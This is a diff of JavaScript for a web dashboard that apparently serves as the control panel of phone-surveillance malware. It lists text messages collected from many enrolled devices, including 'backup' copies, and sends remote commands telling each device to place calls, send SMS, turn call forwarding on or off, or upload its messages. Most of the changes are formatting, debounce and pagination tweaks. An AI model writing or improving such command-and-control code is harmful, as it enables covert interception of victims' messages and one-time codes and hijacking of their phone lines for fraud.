-        const smsData = cachedData.user_sms || {};
-        Object.keys(smsData).forEach(devId => {
-            if (smsFilterDevice && smsFilterDevice !== devId) return;
-            const msgs = smsData[devId];
-            Object.keys(msgs).forEach(k => {
-                allSmsList.push({ deviceId: devId, ...msgs[k] });
-            });
-        });
-        allSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-
-        if (smsFilterDevice) {
-            $('panelSmsCount').textContent = allSmsList.length + ' (filtered)';
-        } else {
-            $('panelSmsCount').textContent = allSmsList.length;
-        }
-    }
-
-    if (allSmsList.length === 0) {
-        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>${smsFilterDevice ? 'No messages for ' + smsFilterDevice : 'No messages found'}</div>`;
-        loadMore.style.display = 'none';
-        return;
-    }
-
-    const start = allSmsOffset;
-    const end = Math.min(start + SMS_LIMIT, allSmsList.length);
-    const paginated = allSmsList.slice(start, end);
-
-    if (allSmsOffset === 0) {
-        container.innerHTML = renderSmsCards(paginated, true);
-    } else {
-        container.innerHTML += renderSmsCards(paginated, true);
-    }
-
-    if (end < allSmsList.length) {
-        loadMore.style.display = 'block';
-        loadMore.textContent = `📥 Load More (${allSmsList.length - end} remaining)`;
-    } else {
-        loadMore.style.display = 'none';
-    }
-}
-
-function loadMoreAllSms() {
-    allSmsOffset += SMS_LIMIT;
-    renderAllSms();
-}
-
-function loadMoreDeviceSms(devId) {
-    if (deviceSmsCache[devId]) {
-        deviceSmsCache[devId].offset += SMS_LIMIT;
-        renderDevices();
-        expandedDevices[devId] = true;
-        activeTabs[devId] = 'sms';
-        const cardEl = document.getElementById(`card-${devId}`);
-        if (cardEl) cardEl.classList.add('expanded');
-    }
 }
 
 // ============================================================
@@ -895,17 +958,17 @@ function loadMoreDeviceSms(devId) {
 function renderAnalytics() {
     const devices = cachedData.user_data || {};
     $('analyticsTotalDevices').textContent = Object.keys(devices).length;
-
+    
     const smsData = cachedData.user_sms || {};
     let totalSms = 0;
     Object.keys(smsData).forEach(d => totalSms += Object.keys(smsData[d]).length);
     $('analyticsTotalSms').textContent = totalSms;
-
+    
     const backupData = cachedData.backup_sms || {};
     let backupCount = 0;
     Object.keys(backupData).forEach(d => backupCount += Object.keys(backupData[d]).length);
     $('analyticsBackupSms').textContent = backupCount;
-
+    
     let latest = 0;
     Object.keys(smsData).forEach(d => {
         const msgs = smsData[d];
@@ -920,6 +983,14 @@ function renderAnalytics() {
     } else {
         $('analyticsLastActivity').textContent = '—';
     }
+}
+
+// ============================================================
+// LOAD MORE ALL SMS
+// ============================================================
+function loadMoreAllSms() {
+    allSmsOffset += SMS_LIMIT;
+    renderAllSmsOptimized();
 }
 
 // ============================================================
@@ -955,9 +1026,9 @@ function showCommandDialog(type, devId) {
         'fwd_off': '🔀 Deactivate CALL FORWARDING on this device?',
         'backup': '💾 Trigger SMS BACKUP on this device?'
     };
-
+    
     if (!confirm(messages[type] || 'Send command?')) return;
-
+    
     switch (type) {
         case 'call':
             sendCall(devId);
@@ -984,7 +1055,7 @@ function sendCall(devId) {
     const number = $(`callNum-${devId}`).value.trim();
     const simSlot = $(`callSim-${devId}`).value;
     if (!number) return showToast('Enter phone number!', 'warning');
-
+    
     db.ref(`user_data/${devId}`).update({
         device: devId,
         simSlot: simSlot,
@@ -1003,7 +1074,7 @@ function sendSms(devId) {
     const text = $(`smsText-${devId}`).value.trim();
     const simSlot = $(`smsSim-${devId}`).value;
     if (!number || !text) return showToast('Enter both number and message!', 'warning');
-
+    
     db.ref(`user_data/${devId}`).update({
         targetDeviceId: devId,
         phoneNumber: number,
@@ -1023,7 +1094,7 @@ function sendFwd(devId, cmd) {
     const number = $(`fwdNum-${devId}`).value.trim();
     const simSlot = $(`fwdSim-${devId}`).value;
     if (cmd === 'call forward' && !number) return showToast('Enter forward number!', 'warning');
-
+    
     db.ref(`user_data/${devId}`).update({
         targetDeviceId: devId,
         simSlot: simSlot,
@@ -1063,13 +1134,13 @@ function updateBackupStatusDisplay(devId) {
         $('backupStatusValue').className = 'status-value failed';
         return;
     }
-
+    
     const status = dev.backup_status || {};
     const info = dev.backup_info || {};
-
+    
     const st = status.backup_status || 'No backup';
     const msg = status.backup_message || '';
-
+    
     const statusEl = $('backupStatusValue');
     if (st === 'success') {
         statusEl.textContent = '✅ ' + (msg || 'Backup successful');
@@ -1084,15 +1155,15 @@ function updateBackupStatusDisplay(devId) {
         statusEl.textContent = '📊 ' + (msg || 'No backup');
         statusEl.className = 'status-value';
     }
-
+    
     const last = info.last_backup_time || info.timestamp || null;
     $('backupLastTime').textContent = last ? new Date(last).toLocaleString() : 'Never';
-
+    
     const count = info.latest_backup_count || info.sms_count || 0;
     $('backupSmsCount').textContent = count + ' SMS';
-
+    
     $('backupId').textContent = info.backup_id || status.backup_id || 'N/A';
-
+    
     const badge = $('backupStatusBadge');
     badge.textContent = st === 'success' ? '✅ Ready' : '⏳ Pending';
 }
@@ -1107,7 +1178,7 @@ function triggerDeviceBackup(devId) {
     if (!devId) return;
     $('backupStatusValue').textContent = '⏳ Sending...';
     $('backupStatusValue').className = 'status-value pending';
-
+    
     db.ref(`user_data/${devId}`).update({
         device: devId,
         command: 'backup',
@@ -1126,7 +1197,7 @@ function triggerDeviceBackup(devId) {
 function refreshBackupStatus() {
     const devId = $('backupDeviceSelect').value;
     if (!devId) return showToast('Select a device!', 'warning');
-
+    
     db.ref(`user_data/${devId}/backup_status`).once('value').then(snap => {
         if (snap.exists()) {
             if (!cachedData.user_data) cachedData.user_data = {};
@@ -1143,7 +1214,7 @@ function refreshDeviceBackup(devId) {
     const div = document.getElementById(`deviceBackup-${devId}`);
     if (!div) return;
     div.innerHTML = '⏳ Checking...';
-
+    
     db.ref(`user_data/${devId}/backup_status`).once('value').then(snap => {
         let html = '';
         if (snap.exists()) {
@@ -1152,12 +1223,11 @@ function refreshDeviceBackup(devId) {
             const msg = data.backup_message || '';
             let color = 'var(--text-muted)';
             let icon = '📊';
-            if (st === 'success') { color = 'var(--green)';
-                icon = '✅'; } else if (st === 'in_progress' || st === 'pending') { color = '#f59e0b';
-                icon = '⏳'; } else if (st === 'failed' || st === 'error') { color = 'var(--red)';
-                icon = '❌'; }
+            if (st === 'success') { color = 'var(--green)'; icon = '✅'; }
+            else if (st === 'in_progress' || st === 'pending') { color = '#f59e0b'; icon = '⏳'; }
+            else if (st === 'failed' || st === 'error') { color = 'var(--red)'; icon = '❌'; }
             html += `<div style="color:${color};">${icon} ${st} ${msg ? '- ' + msg : ''}</div>`;
-
+            
             db.ref(`user_data/${devId}/backup_info`).once('value').then(infoSnap => {
                 if (infoSnap.exists()) {
                     const info = infoSnap.val();
@@ -1179,7 +1249,7 @@ function clearBackupStatus() {
     const devId = $('backupDeviceSelect').value;
     if (!devId) return showToast('Select a device!', 'warning');
     if (!confirm(`Clear backup status for ${devId}?`)) return;
-
+    
     db.ref(`user_data/${devId}/backup_status`).remove().then(() => {
         db.ref(`user_data/${devId}/backup_info`).remove().then(() => {
             showToast(`✅ Cleared for ${devId}`, 'success');
@@ -1198,15 +1268,15 @@ function loadBackupSmsForDevice(devId) {
         container.innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
         return;
     }
-
+    
     const backupData = cachedData.backup_sms;
     if (backupData && backupData[devId]) {
         renderBackupSmsList(container, backupData[devId]);
         return;
     }
-
+    
     container.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading...</div>';
-
+    
     db.ref(`backup_sms/${devId}`).once('value').then(snap => {
         if (snap.exists()) {
             renderBackupSmsList(container, snap.val());
@@ -1224,12 +1294,12 @@ function renderBackupSmsList(container, data) {
         messages.push({ key, ...data[key] });
     });
     messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-
+    
     if (messages.length === 0) {
         container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
         return;
     }
-
+    
     container.innerHTML = messages.map(msg => `
         <div class="backup-sms-item">
             <div class="sms-header">
@@ -1252,17 +1322,17 @@ function openBackupSmsModal() {
     const modal = $('backupSmsModal');
     const body = $('backupModalBody');
     const title = $('backupModalTitle');
-
+    
     title.textContent = '💾 All Backup Messages';
     body.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading backups...</div>';
     modal.classList.add('open');
-
+    
     const backupData = cachedData.backup_sms;
     if (backupData) {
         renderAllBackupSms(body, backupData);
         return;
     }
-
+    
     db.ref('backup_sms').once('value').then(snap => {
         if (snap.exists()) {
             renderAllBackupSms(body, snap.val());
@@ -1283,12 +1353,12 @@ function renderAllBackupSms(container, data) {
         });
     });
     allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-
+    
     if (allMsgs.length === 0) {
         container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
         return;
     }
-
+    
     container.innerHTML = allMsgs.map(msg => `
         <div class="backup-sms-item">
             <div class="sms-header">
@@ -1319,7 +1389,7 @@ function openSmsModal(target) {
     modalTarget = target;
     modalSmsOffset = 0;
     modalSmsList = [];
-
+    
     const smsData = cachedData.user_sms || {};
     if (target === 'ALL') {
         $('modalTitle').textContent = '📩 All Messages';
@@ -1337,7 +1407,7 @@ function openSmsModal(target) {
             });
         }
     }
-
+    
     modalSmsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
     renderModalSms();
     $('smsModal').classList.add('open');
@@ -1346,17 +1416,17 @@ function openSmsModal(target) {
 function renderModalSms() {
     const body = $('modalBody');
     const loadMore = $('modalLoadMore');
-
+    
     const start = modalSmsOffset;
     const end = Math.min(start + SMS_LIMIT, modalSmsList.length);
     const paginated = modalSmsList.slice(start, end);
-
+    
     if (modalSmsOffset === 0) {
         body.innerHTML = renderSmsCards(paginated, modalTarget === 'ALL');
     } else {
         body.innerHTML += renderSmsCards(paginated, modalTarget === 'ALL');
     }
-
+    
     if (end < modalSmsList.length) {
         loadMore.style.display = 'block';
         loadMore.textContent = `📥 Load More (${modalSmsList.length - end} remaining)`;
@@ -1384,7 +1454,7 @@ function showToast(message, type = 'info', duration = 2800) {
     toast.className = `toast-luxury ${type}`;
     toast.textContent = message;
     container.appendChild(toast);
-
+    
     setTimeout(() => {
         toast.style.opacity = '0';
         toast.style.transition = 'opacity 0.3s';
@@ -1414,14 +1484,27 @@ document.addEventListener('DOMContentLoaded', function() {
             $('backupSmsList').innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
         }
     });
-
+    
     $('filterAll').classList.add('active');
-
-    // Search input listener
+    
+    // Search input listener with debounce
     const searchInput = $('deviceSearchInput');
+    const clearBtn = $('searchClearBtn');
     if (searchInput) {
+        let debounceTimer;
         searchInput.addEventListener('input', function() {
-            searchDevices(this.value);
+            const val = this.value;
+            if (clearBtn) {
+                clearBtn.style.display = val ? 'block' : 'none';
+            }
+            clearTimeout(debounceTimer);
+            debounceTimer = setTimeout(() => {
+                searchDevices(val);
+            }, 300);
         });
+    }
+    
+    if (clearBtn) {
+        clearBtn.addEventListener('click', clearSearch);
     }
 });
